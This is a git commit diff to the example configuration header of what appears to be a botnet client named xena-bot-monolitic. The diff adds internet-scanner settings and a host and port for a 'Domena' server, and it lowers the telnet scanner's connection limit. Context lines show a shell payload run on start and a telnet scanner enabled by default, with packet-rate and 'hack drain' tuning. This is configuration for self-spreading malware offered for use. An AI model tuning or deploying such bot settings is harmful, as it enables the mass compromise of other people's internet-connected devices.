e4e2e53177e72769b903cf4231fb4df58af89fa3
Zarkones <17931195+zarkones@users.noreply.github.com>
2022-01-29 12:33:54 +0100

    Fix env example for monolitic bot.

--- bots/xena-bot-monolitic/env.example.hpp
+++ bots/xena-bot-monolitic/env.example.hpp
@@ -13,13 +13,21 @@
 // This is optional. Comment-out if you wish not to have shell code executed on start.
 #define PAYLOAD O("whoami")
 
+// Internet scanner configuration.
+// #define NET_SCANNER_ON
+#define NET_SCANNER_TIMEOUT 1
+
+#define DOMENA_HOST O("127.0.0.1")
+#define DOMENA_PORT 60798
+#define DOMENA_SSL false
+
 // Defines a read limit from the network.
 #define ENV_NETWORK_READ_MAX 100240
 
 // Comment-out in order to disable the telnet scanner.
 #define TELNET_SCANNER_ON
-// Telnet scanner.
-#define SCANNER_MAX_CONNS 128
+// Telnet scanner configuration.
+#define SCANNER_MAX_CONNS 1
 #define SCANNER_RDBUF_SIZE 256
 #define SCANNER_RAW_PPS 160
 #define SCANNER_HACK_DRAIN 64
